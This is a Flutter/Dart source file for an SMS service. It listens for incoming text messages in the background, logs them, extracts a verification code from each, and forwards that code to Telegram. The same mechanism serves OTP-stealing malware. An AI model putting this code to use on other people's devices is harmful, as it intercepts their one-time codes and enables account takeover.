import 'dart:async';

import 'package:another_telephony/telephony.dart';

import 'log_service.dart';
import 'telegram_service.dart';
import 'code_extractor.dart';

class SmsService {
  final Telephony telephony = Telephony.instance;

  Future<bool> requestPermissions() async {
    final result = await telephony.requestSmsPermissions;
    return result ?? false;
  }

  void startListening({
    required void Function(String sender, String message) onMessage,
  }) {
    telephony.listenIncomingSms(
      onNewMessage: (SmsMessage message) {
        final sender = message.address ?? 'نامشخص';
        final text = message.body ?? '';
        onMessage(sender, text);
      },
      onBackgroundMessage: backgroundMessageHandler,
      listenInBackground: true,
    );
  }
}

@pragma('vm:entry-point')
void backgroundMessageHandler(SmsMessage message) {
  final sender = message.address ?? 'نامشخص';
  final text = message.body ?? '';
  unawaited(_handleBackgroundMessage(sender, text));
}

Future<void> _handleBackgroundMessage(String sender, String text) async {
  if (text.trim().isEmpty) return;

  await LogService().addLog(sender: sender, message: text);

  final code = CodeExtractor.extract(text);
  if (code.isEmpty) return;

  await TelegramService.sendMessage(code);
}
